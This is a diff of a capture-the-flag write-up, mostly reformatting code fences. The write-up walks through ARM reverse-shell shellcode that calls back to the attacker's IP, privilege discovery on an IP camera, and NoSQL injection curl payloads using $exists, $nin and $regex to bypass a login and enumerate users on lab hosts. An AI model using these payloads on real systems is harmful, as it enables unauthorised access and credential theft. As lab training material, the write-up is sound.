@@ -138,7 +138,7 @@ If you've managed to follow my reasoning this far, it should be clear that we ar
 
 Now that we've understood how this works, we can craft our own hex byte string that points back to our local machine IP address - in our case this will be `10.10.52.240`.
 
-```
+```assembly
 /* ADDR */
 mov r1, #0xf0   // store '240' in R1
 lsl r1, #8      // shift by 8 bits to the left
@@ -171,7 +171,7 @@ Just by running the `modified_exploit.py` we get a reverse shell connection to t
 
 Now that we're in we can have a look at the contents of the root folder and we can see that there is a hidden folder called `.emux`.
 
-```
+```console
 $ ls -la
 drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 .
 drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 ..
@@ -191,7 +191,7 @@ drwxr-xr-x   13 1000     1000          4096 Jan 16  2024 var
 ```
 
 Naturally we're drawn to the hidden folder first and looking inside that we can see a hidden file called `.nfs00000000000fa3a300000001`.
-```
+```console
 $ cd .emux
 $ ls -la
 drwxr-xr-x    2 root     root          4096 Jan 16  2024 .
@@ -200,7 +200,7 @@ drwxr-xr-x   14 1000     1000          4096 Dec  4  2023 ..
 ```
 
 The contents of the hidden file appear to be a bash script updating `/var/etc/umconfig.txt` with a new password for user `admin`.
-```
+```console
 $ cat .nfs00000000000fa3a300000001
 #!/bin/sh
 rm -f /dev/abs628
@@ -212,7 +212,7 @@ sed -i 's/password=admin/password=Y3tiStarCur!ous&/' /var/etc/umconfig.txt
 ```
 
 Looking inside `umconfig.txt`, we see a lot of data, but at the very top we can see a username `admin` and a password that got a bit messed up due to a mistake in the bash script we just looked at which prepended (instead of replacing) the old password with the new one.
-```
+```console
 $ cat /var/etc/umconfig.txt
 TABLE=users
 
@@ -239,7 +239,7 @@ With this username / password combination in hand we can now head back to the br
 ### Part 3 - Pivoting with NoSQLi ###
 
 Now that we are on the inside of the network (running off the IP Camera's firmware), it's worth trying to see whether the **"internal-only web application"** is now accessible to us:
-```
+```console
 $ curl -s http://10.10.106.239:8080
 
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
@@ -259,8 +259,8 @@ the credentials required.</p>
 ```
 
 We are served a page saying that the server is expecting us to supply credentials to access it, so perhaps we can try passing the credentials we just retrieved for the camera dashboard:
-```
-curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/
+```console
+$ curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/
 
 <br />
 <b>Warning</b>:  Undefined array key "user" in <b>/var/www/html/index.php</b> on line <b>19</b><br />
@@ -276,7 +276,8 @@ curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/
 </head>
 ```
 This still throws up an error, but if we add the `-L` switch to `curl` it will follow website redirects and this time we get a different result:
-```
+
+```console
 $ curl -u 'admin:Y3<R E D A C T E D>d=admin' -s http://10.10.106.239:8080 -L
 
 <!DOCTYPE html>
@@ -318,11 +319,11 @@ From this output we can tell that the site is expecting us to pass a username an
 
 Let's try and re-write our `curl` command to pass on our username and password to `login.php`.  We also add a `-c` switch to save any cookies served by the page:
 
-```
+```console
 $ curl -s -u 'admin:Y3<R E D A C T E D>n' http://10.10.106.239:8080/login.php -X POST -d 'username=admin&password=Y3<R E D A C T E D>n' -c cookie -L
 ```
 This time we get a response telling us that the username or password are incorrect:
-```
+```console
         <!-- Error message -->
                   <p class="py-4 mt-3 text-center bg-thm-900 text-sm text-red-500 border rounded-md border-red-500">
             Invalid username or password          </p>
@@ -334,12 +335,12 @@ What followed here was a lot of trial and error and going round in circles until
 
 The following `curl` command effictively matches to the first user in the database that has a non-null username and password:
 
-```
+```console
 $ curl -s -u 'admin:Y3<R E D A C T E D>n' http://10.10.106.239:8080/login.php -X POST -d 'username[$exists]=true&password[$exists]=true' -c cookie.txt -L
 ```
 
 And it works!  I'm now presented with a different HTML which includes the message **Welcome `Frostbite`!**.
-``` 
+```html 
 <!DOCTYPE html>
 <html lang="en" class="h-full bg-thm-800">
 ...
@@ -361,8 +362,8 @@ It would appear that the first username in the database is `Frostbite` but their
 
 To do this I modified the `curl` command I used earlier to now exclude the username `Frostbite` and match on the next available one:
 
-```
-curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&password[$regex]=.*' -L -c cookie
+```console
+$ curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&password[$regex]=.*' -L -c cookie
 ```
 
 This time we see the message **Welcome `Snowballer`!**, but again not much else.  
@@ -396,19 +397,19 @@ Frosteau
 It was not possible to retrieve any further usernames, so I am assuming that this list is comprehensive, but nevertheless the `curl` request that returned the last username; `Frosteau` had a significantly larger file size - so that is most probably the user we should be looking at anyway.
 
 The final curl command I used was:
-```
-curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
+```console
+$ curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
 ```
 
 Which gave me the following output:
-```
+```console
 <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frosteau!</h1>
 Size: 13899
 ```
 
 And now that we know that we're interested in retrieving `Frosteau`'s dashboard we can clean up this `curl` command and shorten it to the following:
-```
-curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username=Frosteau&password[$exists]=true' -L -c cookie 
+```console
+$ curl -u 'admin:Y3<R E D A C T E D>n' -s http://10.10.106.239:8080/login.php -X POST -d 'username=Frosteau&password[$exists]=true' -L -c cookie 
 ```
 
 Finally we are served `Frosteau`'s dashboard which - luckily for us - includes the contents of `yetikey2.txt` in cleartext in his 'Important Notes' section:
